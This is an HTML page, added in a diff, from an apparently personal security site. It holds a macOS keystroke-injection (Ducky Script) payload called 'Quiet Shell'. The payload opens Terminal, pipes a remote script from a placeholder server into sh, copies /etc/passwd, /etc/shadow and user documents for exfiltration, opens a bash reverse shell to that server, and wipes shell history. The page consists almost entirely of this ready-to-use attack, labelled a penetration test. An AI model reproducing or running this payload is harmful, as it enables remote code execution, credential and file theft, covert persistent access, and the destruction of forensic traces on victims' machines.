@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Quiet Shell - readloud.org</title>
+    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+        ];
+
+    </script>
+    <script src="../../../../js/base.js"></script>
+      <script src="../../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <p>DELAY 500
+REM Description: This script downloads a remote script, performs data exfiltration, sets up a reverse shell, and cleans its traces, demonstrating a comprehensive USB keystroke injection penetration test.</p>
+<p>REM Open Terminal
+GUI SPACE
+DELAY 500
+STRING Terminal
+ENTER
+DELAY 500</p>
+<p>REM Download and run a script from a remote server
+STRING curl http://your-server.com/script.sh | sh
+ENTER
+DELAY 1000</p>
+<p>REM Create directories
+STRING mkdir -p /exfilit/files
+ENTER
+DELAY 500</p>
+<p>REM Attempt to copy user data if read permissions are available
+STRING if [ -r /etc/passwd ]; then cp /etc/passwd /exfilit/files; fi
+ENTER
+STRING if [ -r /etc/shadow ]; then cp /etc/shadow /exfilit/files; fi
+ENTER
+DELAY 500</p>
+<p>REM Find and copy files under 70MB
+STRING find ~/Documents ~/Downloads -type f -size -70M -exec cp -n {} /exfilit/files \;
+ENTER</p>
+<p>REM Set up a reverse shell for persistent access
+STRING bash -i &gt;&amp; /dev/tcp/your-server.com/8080 0&gt;&amp;1 &amp;
+ENTER</p>
+<p>REM Clean up any trace of its actions from system logs
+STRING history -c
+ENTER
+STRING rm ~/.bash_history
+ENTER</p>
+<p>REM Exit the terminal
+STRING exit
+ENTER</p>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/explore/Hak5-oMG/macOS/Quiet-Shell.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
